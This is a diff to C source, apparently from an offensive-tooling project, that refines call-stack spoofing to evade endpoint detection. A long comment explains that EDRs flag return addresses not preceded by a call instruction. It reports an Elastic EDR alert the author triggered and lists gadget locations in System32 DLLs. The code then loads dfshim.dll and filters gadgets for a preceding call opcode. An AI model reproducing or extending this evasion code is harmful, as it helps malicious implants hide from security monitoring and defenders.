@@ -108,7 +108,101 @@ void init_frame_info ( SYNTHETIC_STACK_FRAME * frame )
     frame->Frame2.FunctionAddress = ( PVOID ) GetProcAddress ( ( HMODULE ) frame2_module, "RtlUserThreadStart" );
     frame->Frame2.Offset          = 0x2c;
 
-    frame->Gadget                 = KERNEL32$GetModuleHandleA ( "KernelBase.dll" );
+    /*
+    We need a module that contains following instruction sequence:
+        e8 ?? ?? ?? ??     call    <relative address>
+        ff 23              jmp     qword ptr [rbx]
+
+    The explanation for this request is in Zero Point Security - Red Team Ops II training, chapter "4. Load-Time Evasion", paragraph "Call me maybe":
+        The `jmp qword ptr [rbx]` is a gadget which we will use during call stack spoofing for jumping back to our logic. 
+        Some EDRs will check the instruction that precedes a frame's return address and use the absence of a call instruction as an IoC for call stack spoofing.
+        We therefore ideally only want to use gadgets that come directly after a call.
+    I also verified, that when the `call` instruction is not present before the `jmp` gadget, the Elastis Security EDR creates an alert:
+        Alert: Malicious Behavior Detection Alert: Suspicious Network Module LoadLibrary
+            Detects attempts to load a Microsoft networking related module from a potentially altered call stack in order to conceal the true source of the call.
+
+    Unfortunately, none of these instruction sequences exist in a DLL that's loaded into a process by default, like KernelBase.
+    We need to find another Windows DLL which contains such a gadget. We can do it using the https://github.com/rasta-mouse/GadgetHunter tool. 
+    Here is its output for the C:\Windows\System32 folder:
+
+    |-> C:\Windows\System32\archiveint.dll
+    |--> Found 1 gadget(s)
+    |---> jmp qword ptr [rbx] @ 0x18010ED48 - call @ 0x18010ED43
+
+    |-> C:\Windows\System32\AuthFWSnapin.dll
+    |--> Found 6 gadget(s)
+    |---> jmp qword ptr [rdi] @ 0x101F1BBB - call @ 0x101F1BB6
+    |---> jmp qword ptr [rdi] @ 0x101F1DBB - call @ 0x101F1DB6
+    |---> jmp qword ptr [rbx] @ 0x10250D98 - call @ 0x10250D93
+    |---> jmp qword ptr [rdi] @ 0x1047201B - call @ 0x10472016
+    |---> jmp qword ptr [rdi] @ 0x1047221B - call @ 0x10472216
+    |---> jmp qword ptr [rbx] @ 0x104D10FB - call @ 0x104D10F6
+
+    |-> C:\Windows\System32\ControlCenter.dll
+    |--> Found 3 gadget(s)
+    |---> jmp qword ptr [rsi] @ 0x18008EA63 - call @ 0x18008EA5E
+    |---> jmp qword ptr [rbx] @ 0x1800BEDF3 - call @ 0x1800BEDEE
+    |---> jmp qword ptr [rsi] @ 0x1800F5459 - call @ 0x1800F5454
+
+    |-> C:\Windows\System32\d3dcsx_42.dll
+    |--> Found 1 gadget(s)
+    |---> jmp qword ptr [rbx] @ 0x18044C3C2 - call @ 0x18044C3BD
+
+    |-> C:\Windows\System32\dbgeng.dll
+    |--> Found 1 gadget(s)
+    |---> jmp qword ptr [rdi] @ 0x18011DEE7 - call @ 0x18011DEE2
+
+    |-> C:\Windows\System32\dfshim.dll
+    |--> Found 3 gadget(s)
+    |---> jmp qword ptr [rbx] @ 0x18002F3E5 - call @ 0x18002F3E0
+    |---> jmp qword ptr [rbx] @ 0x18003863D - call @ 0x180038638
+    |---> jmp qword ptr [rbx] @ 0x1800E32EA - call @ 0x1800E32E5
+
+    |-> C:\Windows\System32\directml.dll
+    |--> Found 1 gadget(s)
+    |---> jmp qword ptr [rsi] @ 0x18026F0B9 - call @ 0x18026F0B4
+
+    |-> C:\Windows\System32\DXCaptureReplay.dll
+    |--> Found 1 gadget(s)
+    |---> jmp qword ptr [rdi] @ 0x1809ACE91 - call @ 0x1809ACE8C
+
+    |-> C:\Windows\System32\edgehtml.dll
+    |--> Found 1 gadget(s)
+    |---> jmp qword ptr [rdi] @ 0x1801C093D - call @ 0x1801C0938
+
+    |-> C:\Windows\System32\MessagingDataModel2.dll
+    |--> Found 1 gadget(s)
+    |---> jmp qword ptr [rdi] @ 0x180059455 - call @ 0x180059450
+
+    |-> C:\Windows\System32\mprddm.dll
+    |--> Found 1 gadget(s)
+    |---> jmp qword ptr [rdi] @ 0x180035031 - call @ 0x18003502C
+
+    |-> C:\Windows\System32\onnxruntime.dll
+    |--> Found 1 gadget(s)
+    |---> jmp qword ptr [rbx] @ 0x18018BD5D - call @ 0x18018BD58
+
+    |-> C:\Windows\System32\ucrtbase.dll
+    |--> Found 2 gadget(s)
+    |---> jmp qword ptr [rbx] @ 0x180087F9F - call @ 0x180087F9A
+    |---> jmp qword ptr [rbx] @ 0x18008EB13 - call @ 0x18008EB0E
+
+    |-> C:\Windows\System32\ucrtbase_enclave.dll
+    |--> Found 1 gadget(s)
+    |---> jmp qword ptr [rbx] @ 0x18003B7BF - call @ 0x18003B7BA
+
+    |-> C:\Windows\System32\wlancfg.dll
+    |--> Found 1 gadget(s)
+    |---> jmp qword ptr [rsi] @ 0x18001B711 - call @ 0x18001B70C
+    */
+    const char * GADGET_DLL = "dfshim.dll";
+    PVOID gadget = KERNEL32$GetModuleHandleA ( GADGET_DLL );
+    if ( gadget != NULL ) {
+        frame->Gadget = gadget;
+    }
+    else {
+        frame->Gadget = LoadLibraryA ( GADGET_DLL );
+    }
 }
 
 BOOL get_text_section_size ( PVOID module, PDWORD virtual_address, PDWORD size )
@@ -274,13 +368,17 @@ PVOID find_gadget( PVOID module )
             /* x64 opcodes are ff 23 */
             if ( ( ( PBYTE ) module_text_section ) [ i ] == 0xFF && ( ( PBYTE ) module_text_section ) [ i + 1 ] == 0x23 )
             {
-                gadget_list [ counter ] = ( PVOID ) ( ( UINT_PTR ) module_text_section + i );
-                counter++;
+                /* check for a call before the gadget */
+                if ( ( ( PBYTE ) module_text_section ) [ i - 5 ] == 0xE8 )
+                {
+                    gadget_list [ counter ] = ( PVOID ) ( ( UINT_PTR ) module_text_section + i );
+                    counter++;
 
-                if ( counter == 15 ) {
-                    break;
-                }          
-            }
+                    if ( counter == 15 ) {
+                        break;
+                    }
+                }
+            }        
         }
 
         found_gadgets = TRUE;
